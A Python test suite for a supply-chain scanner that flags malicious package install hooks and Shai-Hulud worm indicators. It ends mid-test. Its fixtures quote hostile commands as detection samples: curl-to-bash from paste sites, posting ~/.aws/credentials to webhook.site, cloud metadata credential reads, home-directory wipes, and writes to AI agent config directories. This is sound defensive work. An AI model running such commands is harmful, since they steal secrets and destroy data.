"""Tests for scan_lifecycle.py - Lifecycle Script Scanner."""

import json
import scan_lifecycle as scanner


class TestNpmHooks:
    def test_detects_suspicious_postinstall(self, repo_with_lifecycle_hooks):
        findings = scanner.scan_package_json(
            str(repo_with_lifecycle_hooks / "package.json"),
            "package.json"
        )
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) > 0
        assert any("curl" in f.snippet for f in critical)

    def test_benign_hook_is_medium(self, tmp_path):
        """Hook with no suspicious commands should be MEDIUM."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "prepare": "echo 'normal build step'"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        prepare_findings = [f for f in findings if "prepare" in f.snippet]
        assert len(prepare_findings) == 1
        assert prepare_findings[0].severity == "medium"

    def test_node_setup_js_is_high(self, tmp_path):
        """postinstall: node setup.js should be HIGH (standard attack pattern)."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node setup.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert len(postinstall) >= 1
        # After 2.5 implementation, this should be HIGH
        assert any(f.severity == "high" for f in postinstall)

    def test_python_script_relay_is_high(self, tmp_path):
        """postinstall: python install.py should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "python install.py"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "high" for f in postinstall)

    def test_sh_script_relay_is_high(self, tmp_path):
        """preinstall: sh setup.sh should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "preinstall": "sh setup.sh"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        preinstall = [f for f in findings if "preinstall" in f.snippet]
        assert any(f.severity == "high" for f in preinstall)

    def test_path_script_relay_is_high(self, tmp_path):
        """postinstall: node ./scripts/setup.js should be HIGH."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node ./scripts/setup.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        postinstall = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "high" for f in postinstall)

    def test_compound_command_stays_medium(self, tmp_path):
        """node build.js && npm test should stay MEDIUM (not exact match)."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "prepare": "node build.js && npm test"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        prepare = [f for f in findings if "prepare" in f.snippet]
        assert len(prepare) >= 1
        assert all(f.severity == "medium" for f in prepare)

    def test_no_hooks_no_findings(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {"start": "node index.js", "test": "jest"}
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        assert len(findings) == 0


class TestBindingGyp:
    def test_detects_binding_gyp(self, tmp_path):
        """binding.gyp should be flagged as HIGH (implicit native execution)."""
        gyp = tmp_path / "binding.gyp"
        gyp.write_text('{"targets":[{"target_name":"native"}]}')
        # Run the main() dispatch logic
        import forensics_core as core
        findings = []
        for fp, rp in core.walk_repo(str(tmp_path), skip_lockfiles=True):
            import os
            if os.path.basename(fp) == 'binding.gyp':
                findings.append(core.Finding(
                    scanner="lifecycle", severity="high",
                    title="binding.gyp: Implicit Native Build",
                    description="binding.gyp triggers node-gyp rebuild",
                    file=rp, line=0, snippet="binding.gyp present",
                    category="lifecycle-hook"
                ))
        assert any(f.severity == "high" and "binding.gyp" in f.title for f in findings)


class TestAntiForensics:
    def test_detects_self_deleting_script(self, tmp_path):
        js = tmp_path / "setup.js"
        js.write_text("const fs = require('fs');\nfs.unlinkSync(__filename);\n")
        findings = scanner.scan_js_anti_forensics(str(js), "setup.js")
        assert any(f.category == "anti-forensics" for f in findings)


class TestInstallScriptIOCs:
    def test_detects_vpmdhaj_payload_markers(self, tmp_path):
        js = tmp_path / "setup.mjs"
        js.write_text(
            "fetch('http://aab.sportsontheweb.net/x.php', {headers: {'X-Supply': '1'}})\n"
            "spawn('./payload.bin', [], {env: {__DAEMONIZED: '1'}})\n"
        )
        findings = scanner.scan_js_anti_forensics(str(js), "setup.mjs")
        iocs = [f for f in findings if f.category == "install-script-ioc"]
        assert len(iocs) >= 3
        assert all(f.severity == "critical" for f in iocs)

    def test_detects_cloud_metadata_access_in_install_script(self, tmp_path):
        js = tmp_path / "preinstall.js"
        js.write_text(
            "const url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';\n"
            "fetch(url).then(r => r.text())\n"
        )
        findings = scanner.scan_js_anti_forensics(str(js), "preinstall.js")
        assert any("metadata" in f.title.lower() for f in findings)

    def test_detects_npm_token_enumeration_endpoint(self, tmp_path):
        js = tmp_path / "preinstall.js"
        js.write_text("fetch('https://registry.npmjs.org/-/npm/v1/tokens')\n")
        findings = scanner.scan_js_anti_forensics(str(js), "preinstall.js")
        assert any("npm token" in f.title.lower() for f in findings)

    def test_detects_miasma_process_memory_and_marker(self, tmp_path):
        js = tmp_path / "index.js"
        js.write_text(
            "const marker = 'Miasma: The Spreading Blight';\n"
            "fs.readFileSync('/proc/self/mem');\n"
            "const params = {bypass_2fa: true};\n"
        )
        findings = scanner.scan_js_anti_forensics(str(js), "index.js")
        iocs = [f for f in findings if f.category == "install-script-ioc"]
        assert len(iocs) >= 3

    def test_index_js_ioc_only_pass_detects_miasma_marker(self, tmp_path):
        js = tmp_path / "index.js"
        js.write_text("console.log('Miasma: The Spreading Blight')\n")
        findings = scanner.scan_js_install_iocs(str(js), "index.js")
        assert any(f.category == "install-script-ioc" for f in findings)

    def test_safe_setup_script_no_ioc_finding(self, tmp_path):
        js = tmp_path / "setup.js"
        js.write_text("console.log('building native assets')\n")
        findings = scanner.scan_js_anti_forensics(str(js), "setup.js")
        assert not any(f.category == "install-script-ioc" for f in findings)


class TestSetupPy:
    def test_detects_cmdclass(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("from setuptools import setup\nsetup(cmdclass = {'install': Evil})\n")
        findings = scanner.scan_setup_py(str(setup), "setup.py")
        assert any("cmdclass" in f.title.lower() for f in findings)

    def test_detects_subprocess_in_setup(self, tmp_path):
        setup = tmp_path / "setup.py"
        setup.write_text("import subprocess\nsubprocess.run(['curl', 'http://evil.com'])\n")
        findings = scanner.scan_setup_py(str(setup), "setup.py")
        assert any(f.severity == "critical" for f in findings)


class TestPthFiles:
    def test_detects_known_malicious_pth(self, tmp_path):
        pth = tmp_path / "litellm_init.pth"
        pth.write_text("import litellm_hook\n")
        findings = scanner.scan_pth_files(str(pth), "litellm_init.pth")
        assert any(f.severity == "critical" and "known malicious" in f.title.lower() for f in findings)

    def test_detects_exec_in_pth(self, tmp_path):
        pth = tmp_path / "custom.pth"
        pth.write_text("exec(open('payload.py').read())\n")
        findings = scanner.scan_pth_files(str(pth), "custom.pth")
        assert any(f.severity == "critical" for f in findings)


class TestPasteServiceUrls:
    def test_pastebin_in_postinstall_is_critical(self, tmp_path):
        """postinstall with pastebin.com URL should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "curl -s https://pastebin.com/raw/abc123 | bash"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "paste" in f.title.lower() or "pastebin" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL paste service finding, got: {[f.title for f in findings]}"

    def test_raw_github_in_preinstall_is_critical(self, tmp_path):
        """preinstall fetching raw.githubusercontent.com should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "preinstall": "curl https://raw.githubusercontent.com/evil/repo/main/payload.sh | sh"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "paste" in f.title.lower() or "raw" in f.snippet.lower() or "github" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL raw GitHub finding, got: {[f.title for f in findings]}"

    def test_webhook_site_in_install_is_critical(self, tmp_path):
        """install hook referencing webhook.site should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "install": "curl -X POST https://webhook.site/abc123 -d @~/.aws/credentials"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "paste" in f.title.lower() or "webhook" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL webhook finding, got: {[f.title for f in findings]}"

    def test_normal_hook_no_paste_finding(self, tmp_path):
        """Hook with no paste service URLs should not trigger paste findings."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node build.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        paste_findings = [f for f in findings if "paste" in f.title.lower()]
        assert len(paste_findings) == 0, f"Unexpected paste findings: {[f.title for f in paste_findings]}"


class TestAgentConfigDirWrites:
    def test_claude_config_write_in_postinstall_is_critical(self, tmp_path):
        """postinstall writing to ~/.claude/ should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "mkdir -p ~/.claude/commands && cp hook.sh ~/.claude/commands/"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "agent config" in f.title.lower() or ".claude" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL agent config write finding, got: {[f.title for f in findings]}"

    def test_cursor_config_write_is_critical(self, tmp_path):
        """postinstall writing to ~/.cursor/ should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "cp config.json ~/.cursor/settings.json"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "agent config" in f.title.lower() or ".cursor" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL cursor config write finding, got: {[f.title for f in findings]}"

    def test_mkdir_agent_config_pattern(self, tmp_path):
        """postinstall creating dir under .claude/ should trigger a CRITICAL finding."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "mkdir ~/.claude/"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert any(
            "agent config" in f.title.lower() or ".claude" in f.snippet.lower()
            for f in critical
        ), f"Expected CRITICAL mkdir agent config finding, got: {[f.title for f in findings]}"

    def test_no_false_positive_on_safe_hook(self, tmp_path):
        """Hook with no agent config writes should not trigger agent config findings."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "test",
            "scripts": {
                "postinstall": "node build.js"
            }
        }))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        agent_findings = [f for f in findings if "agent config" in f.title.lower()]
        assert len(agent_findings) == 0, f"Unexpected agent config findings: {[f.title for f in agent_findings]}"


class TestKnownSafeHooks:
    """Known-safe postinstall commands should be LOW severity."""

    def test_husky_install_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "husky install"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings), f"Got: {[(f.title, f.severity) for f in hook_findings]}"

    def test_patch_package_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"prepare": "patch-package"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "prepare" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings)

    def test_prisma_generate_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "prisma generate"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings)

    def test_tsc_is_low(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"prepare": "tsc"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "prepare" in f.snippet]
        assert all(f.severity == "low" for f in hook_findings)

    def test_unknown_stays_medium(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "some-random-cmd"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "medium" for f in hook_findings)

    def test_husky_with_pipe_not_whitelisted(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "scripts": {"postinstall": "husky install && curl evil.com"}}))
        findings = scanner.scan_package_json(str(pkg), "package.json")
        hook_findings = [f for f in findings if "postinstall" in f.snippet]
        assert any(f.severity == "critical" for f in hook_findings)


class TestSecondComingIndicators:
    """scan_second_coming_indicators() — behavioral signatures for the
    "Shai-Hulud: The Second Coming" fake-Bun wave and its Golden Path rename.

    All fixtures are inert pattern strings; none contain working payload logic.
    """

    def test_fake_bun_preinstall_hook(self, tmp_path):
        """`"preinstall": "node setup_bun.js"` is the dropper hook."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t",
            "scripts": {"preinstall": "node setup_bun.js"}
        }))
        findings = scanner.scan_second_coming_indicators(str(pkg), "package.json")
        assert any(
            f.severity == "critical"
            and f.category == "install-script-ioc"
            and "preinstall" in f.title.lower()
            for f in findings
        ), f"Got: {[(f.title, f.category) for f in findings]}"

    def test_dropper_filename_reference(self, tmp_path):
        """A bare reference to bun_environment.js is enough to flag."""
        js = tmp_path / "index.js"
        js.write_text('const p = "./bun_environment.js";\n')
        findings = scanner.scan_second_coming_indicators(str(js), "index.js")
        assert any(
            f.category == "install-script-ioc" and "bun_environment" in f.title
            for f in findings
        )

    def test_actions_secrets_reference(self, tmp_path):
        wf = tmp_path / "ci.yml"
        wf.write_text("jobs:\n  x:\n    steps:\n      - run: cat actionsSecrets.json\n")
        findings = scanner.scan_second_coming_indicators(str(wf), "ci.yml")
        assert any("actionsSecrets.json" in f.title for f in findings)

    def test_second_coming_repo_marker(self, tmp_path):
        """The GitHub dead-drop repository description marker."""
        js = tmp_path / "drop.js"
        js.write_text('const desc = "Sha1-Hulud: The Second Coming";\n')
        findings = scanner.scan_second_coming_indicators(str(js), "drop.js")
        assert any(
            f.severity == "critical" and "dead-drop" in f.title.lower()
            for f in findings
        ), f"Got: {[f.title for f in findings]}"

    def test_sha1hulud_runner_marker(self, tmp_path):
        wf = tmp_path / "runner.yml"
        wf.write_text("runs-on: SHA1HULUD\n")
        findings = scanner.scan_second_coming_indicators(str(wf), "runner.yml")
        assert any("SHA1HULUD" in f.title for f in findings)

    def test_trufflehog_download_and_exec(self, tmp_path):
        """Downloading the TruffleHog binary at install time is the harvest stage."""
        sh = tmp_path / "install.sh"
        sh.write_text("#!/bin/sh\ncurl -sL https://example.invalid/trufflehog -o /tmp/th\n")
        findings = scanner.scan_second_coming_indicators(str(sh), "install.sh")
        assert any(
            f.severity == "critical"
            and f.category == "install-script-ioc"
            and "TruffleHog" in f.title
            for f in findings
        ), f"Got: {[f.title for f in findings]}"

    def test_deadman_rm_rf_home_in_postinstall(self, tmp_path):
        """`rm -rf $HOME` in a lifecycle hook is the dead-man's switch."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t",
            "scripts": {"postinstall": "rm -rf $HOME"}
        }))
        findings = scanner.scan_second_coming_indicators(str(pkg), "package.json")
        deadman = [f for f in findings if f.category == "destructive-fallback"]
        assert len(deadman) >= 1, f"Got: {[(f.title, f.category) for f in findings]}"
        assert all(f.severity == "critical" for f in deadman)
        assert any("home directory" in f.title.lower() for f in deadman)

    def test_deadman_homedir_plus_recursive_rmsync_combo(self, tmp_path):
        """JS form: os.homedir() resolved in the same file as a recursive rmSync."""
        js = tmp_path / "cleanup.js"
        js.write_text(
            "const os = require('os');\n"
            "const home = os.homedir();\n"
            "fs.rmSync(home, { recursive: true, force: true });\n"
        )
        findings = scanner.scan_second_coming_indicators(str(js), "cleanup.js")
        combo = [
            f for f in findings
            if f.category == "destructive-fallback"
            and "Recursively Deleted" in f.title
        ]
        assert len(combo) == 1, f"Got: {[(f.title, f.category) for f in findings]}"
        assert combo[0].severity == "critical"
        assert combo[0].line == 3

    def test_homedir_alone_not_flagged(self, tmp_path):
        """Precision: resolving the home directory without a recursive delete
        is ordinary code and must not fire."""
        js = tmp_path / "config.js"
        js.write_text(
            "const os = require('os');\n"
            "module.exports = { cache: os.homedir() + '/.cache' };\n"
        )
        findings = scanner.scan_second_coming_indicators(str(js), "config.js")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_recursive_delete_alone_not_flagged(self, tmp_path):
        """Precision: a recursive delete of a build dir is ordinary tooling."""
        js = tmp_path / "clean.js"
        js.write_text("fs.rmSync('dist', { recursive: true, force: true });\n")
        findings = scanner.scan_second_coming_indicators(str(js), "clean.js")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_benign_package_json_no_findings(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t",
            "scripts": {"build": "tsc", "postinstall": "husky install"}
        }))
        findings = scanner.scan_second_coming_indicators(str(pkg), "package.json")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_unreadable_file_does_not_raise(self, tmp_path):
        """Missing file is skipped, not fatal (fail-soft contract)."""
        findings = scanner.scan_second_coming_indicators(
            str(tmp_path / "nope.js"), "nope.js"
        )
        assert findings == []


class TestGoldenPathIndicators:
    """New SECOND_COMING_PATTERNS entries for the December 2025 "Golden Path"
    variant, consumed by the existing scan_second_coming_indicators().

    Source: Cobenian/shai-hulud-detect CHANGELOG 3.1.0 -- "Detection for
    obfuscated exfiltration JSON files: `3nvir0nm3nt.json`, `cl0vd.json`,
    `c9nt3nts.json`, `pigS3cr3ts.json`" -- and check_new_workflow_patterns()
    -- "Look for formatter_123456789.yml workflow files".
    """

    def test_obfuscated_exfil_json_reference(self, tmp_path):
        js = tmp_path / "drop.js"
        js.write_text('fs.writeFileSync("3nvir0nm3nt.json", blob);\n')
        findings = scanner.scan_second_coming_indicators(str(js), "drop.js")
        assert any(
            f.severity == "critical"
            and f.category == "install-script-ioc"
            and "3nvir0nm3nt.json" in f.title
            for f in findings
        ), f"Got: {[f.title for f in findings]}"

    def test_all_four_golden_path_names_match(self, tmp_path):
        for name in ("3nvir0nm3nt.json", "cl0vd.json", "c9nt3nts.json", "pigS3cr3ts.json"):
            js = tmp_path / "d.js"
            js.write_text(f'const out = "{name}";\n')
            findings = scanner.scan_second_coming_indicators(str(js), "d.js")
            assert findings, f"{name} did not match"

    def test_benign_json_names_not_flagged(self, tmp_path):
        """Precision: real-word neighbours of the leetspeak names must not fire."""
        js = tmp_path / "d.js"
        js.write_text(
            'const a = "environment.json";\n'
            'const b = "cloud.json";\n'
            'const c = "contents.json";\n'
            'const d = "secrets.json";\n'
        )
        findings = scanner.scan_second_coming_indicators(str(js), "d.js")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_formatter_workflow_filename(self, tmp_path):
        wf = tmp_path / "ci.yml"
        wf.write_text("run: cp payload .github/workflows/formatter_123456789.yml\n")
        findings = scanner.scan_second_coming_indicators(str(wf), "ci.yml")
        assert any("formatter_" in f.title for f in findings), \
            f"Got: {[f.title for f in findings]}"

    def test_ordinary_formatter_workflow_not_flagged(self, tmp_path):
        """Precision: the pattern requires the attacker's numeric suffix."""
        wf = tmp_path / "ci.yml"
        wf.write_text("uses: ./.github/workflows/formatter_check.yml\n")
        findings = scanner.scan_second_coming_indicators(str(wf), "ci.yml")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"


class TestShaiHuludFamilyIndicators:
    """scan_shai_hulud_family_indicators() -- family coverage outside the
    Second Coming wave: dead-drop repo markers, Mini Shai-Hulud droppers,
    wipe-threat token strings, dead-man's-switch daemons, and secure-erase
    wiper stages.

    Every fixture string is an inert IOC literal quoted from the reference
    detector; none contains working payload logic.
    """

    # --- Behaviour class 3: GitHub repo-description / beacon markers ---

    def test_mini_shai_hulud_appeared_marker(self, tmp_path):
        js = tmp_path / "exfil.js"
        js.write_text('desc: "A Mini Shai-Hulud has Appeared",\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
        assert any(
            f.severity == "critical"
            and f.category == "install-script-ioc"
            and "Dead-Drop Marker" in f.title
            for f in findings
        ), f"Got: {[(f.title, f.category) for f in findings]}"

    def test_reversed_here_we_go_again_beacon(self, tmp_path):
        """May 2026 AntV/atool wave stamps the marker character-reversed."""
        js = tmp_path / "exfil.js"
        js.write_text('const b = "niagA oG eW ereH :duluH-iahS";\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
        assert any("reversed" in f.title for f in findings), \
            f"Got: {[f.title for f in findings]}"

    def test_forward_here_we_go_again_marker(self, tmp_path):
        js = tmp_path / "exfil.js"
        js.write_text('description = "Shai-Hulud: Here We Go Again"\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
        assert any("Here We Go Again" in f.title for f in findings)

    def test_goldox_golden_path_marker(self, tmp_path):
        js = tmp_path / "exfil.js"
        js.write_text('d = "Goldox-T3chs: Only Happy Girl"\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
        assert any("Golden Path" in f.title for f in findings)

    def test_hades_and_miasma_hyphen_markers(self, tmp_path):
        js = tmp_path / "exfil.js"
        js.write_text(
            'a = "Hades - The End for the Damned";\n'
            'b = "Miasma - The Spreading Blight";\n'
        )
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
        titles = " ".join(f.title for f in findings)
        assert "Hades" in titles and "Miasma" in titles, f"Got: {titles}"

    def test_attacker_exfil_repo_names(self, tmp_path):
        js = tmp_path / "exfil.js"
        js.write_text('repo = "siridar-ghola-567"\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "exfil.js")
        assert any("exfil repository name" in f.title for f in findings)

    def test_generic_shai_hulud_prose_not_flagged(self, tmp_path):
        """Precision: writing *about* the worm is not being the worm."""
        md = tmp_path / "notes.js"
        md.write_text(
            '// See the Shai-Hulud advisory before upgrading.\n'
            '// Shai-Hulud detection is handled upstream.\n'
        )
        findings = scanner.scan_shai_hulud_family_indicators(str(md), "notes.js")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    # --- Behaviour class 1: Mini Shai-Hulud dropper filenames / delivery ---

    def test_router_init_payload_filename(self, tmp_path):
        js = tmp_path / "index.js"
        js.write_text('require("./router_init.js");\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "index.js")
        assert any(
            f.category == "install-script-ioc" and "router_init.js" in f.title
            for f in findings
        ), f"Got: {[f.title for f in findings]}"

    def test_bun_run_index_preinstall_hook(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t", "scripts": {"preinstall": "bun run index.js"}
        }))
        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
        assert any("Bun dropper hook" in f.title for f in findings), \
            f"Got: {[f.title for f in findings]}"

    def test_orphan_commit_optional_dependency(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t",
            "optionalDependencies": {"g2": "github:antvis/G2#1916faa365f2788b6e193514872d51a242876569"}
        }))
        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
        assert any("orphan-commit ref" in f.title for f in findings)

    def test_fake_tanstack_setup_package(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "t", "dependencies": {"@tanstack/setup": "1.0.0"}}))
        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
        assert any("@tanstack/setup" in f.title for f in findings)

    def test_real_tanstack_packages_not_flagged(self, tmp_path):
        """Precision: the genuine @tanstack namespace must stay clean."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t",
            "dependencies": {
                "@tanstack/react-router": "1.169.6",
                "@tanstack/react-query": "5.0.0",
            },
            "scripts": {"preinstall": "bun run build"},
        }))
        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_router_initializer_not_flagged(self, tmp_path):
        """Precision: router_initializer.js is a near-miss on router_init.js."""
        js = tmp_path / "index.js"
        js.write_text('require("./router_initializer.js");\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "index.js")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    # --- Behaviour class 4: wipe threats, deadman daemons, wiper stages ---

    def test_wipe_threat_token_description(self, tmp_path):
        js = tmp_path / "token.js"
        js.write_text('note: "IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner"\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "token.js")
        assert any(
            f.severity == "critical"
            and f.category == "destructive-fallback"
            and "wipe-threat token" in f.title
            for f in findings
        ), f"Got: {[(f.title, f.category) for f in findings]}"

    def test_wipe_threat_variants_all_match(self, tmp_path):
        for marker in (
            "IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner",
            "IfYouYankThisTokenItWillNukeTheComputerOfTheOwnerFully",
            "RevokeAndItGoesKaboom",
        ):
            js = tmp_path / "t.js"
            js.write_text(f'const m = "{marker}";\n')
            findings = scanner.scan_shai_hulud_family_indicators(str(js), "t.js")
            assert findings, f"{marker} did not match"

    def test_revoke_prose_not_flagged(self, tmp_path):
        """Precision: ordinary wording about revoking a token must not fire."""
        js = tmp_path / "t.js"
        js.write_text('// If you revoke this token it will stop working.\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "t.js")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_deadman_daemon_script_reference(self, tmp_path):
        sh = tmp_path / "install.sh"
        sh.write_text("cp monitor $HOME/.local/bin/gh-token-monitor.sh\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
        assert any(
            f.category == "destructive-fallback" and "gh-token-monitor" in f.title
            for f in findings
        ), f"Got: {[(f.title, f.category) for f in findings]}"

    def test_deadman_launchagent_plist_reference(self, tmp_path):
        sh = tmp_path / "install.sh"
        sh.write_text("launchctl load com.user.kitty-monitor.plist\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
        assert any("LaunchAgent" in f.title for f in findings)

    def test_kitty_cat_payload_path(self, tmp_path):
        sh = tmp_path / "install.sh"
        sh.write_text("python3 $HOME/.local/share/kitty/cat.py &\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
        assert any("cat.py" in f.title for f in findings)

    def test_ordinary_monitor_script_not_flagged(self, tmp_path):
        """Precision: a generic monitor.sh is not the dead-man's switch."""
        sh = tmp_path / "install.sh"
        sh.write_text("cp monitor.sh /usr/local/bin/monitor.sh\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "install.sh")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_shred_home_directory(self, tmp_path):
        sh = tmp_path / "wipe.sh"
        sh.write_text("shred -uvz $HOME/.ssh/id_rsa\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "wipe.sh")
        assert any(
            f.severity == "critical"
            and f.category == "destructive-fallback"
            and "shred" in f.title.lower()
            for f in findings
        ), f"Got: {[(f.title, f.category) for f in findings]}"

    def test_find_home_xargs_shred(self, tmp_path):
        sh = tmp_path / "wipe.sh"
        sh.write_text("find $HOME -type f -writable | xargs shred -u\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "wipe.sh")
        wiper = [f for f in findings if f.category == "destructive-fallback"]
        assert len(wiper) == 1, f"Got: {[f.title for f in findings]}"

    def test_windows_wiper_commands(self, tmp_path):
        for cmd in (
            "cipher /W:%USERPROFILE%",
            "del /F /Q /S %USERPROFILE%\\*",
            "rd /S /Q %USERPROFILE%",
        ):
            bat = tmp_path / "w.bat"
            bat.write_text(cmd + "\n")
            findings = scanner.scan_shai_hulud_family_indicators(str(bat), "w.bat")
            assert findings, f"{cmd!r} did not match"
            assert findings[0].category == "destructive-fallback"

    def test_bun_spawnsync_wiper(self, tmp_path):
        """Bun.spawnSync shelling out to a wiper. The fixture deliberately uses a
        non-$HOME shred target so only the Bun.spawnSync rule can match (the
        per-group break means the first matching wiper rule wins the line)."""
        js = tmp_path / "payload.js"
        js.write_text('Bun.spawnSync(["bash", "-c", "shred -u /tmp/x"]);\n')
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "payload.js")
        assert any("Bun.spawnSync" in f.title for f in findings), \
            f"Got: {[f.title for f in findings]}"

    def test_shred_help_not_flagged(self, tmp_path):
        """Precision: `shred --help` and a scoped cipher call must not fire."""
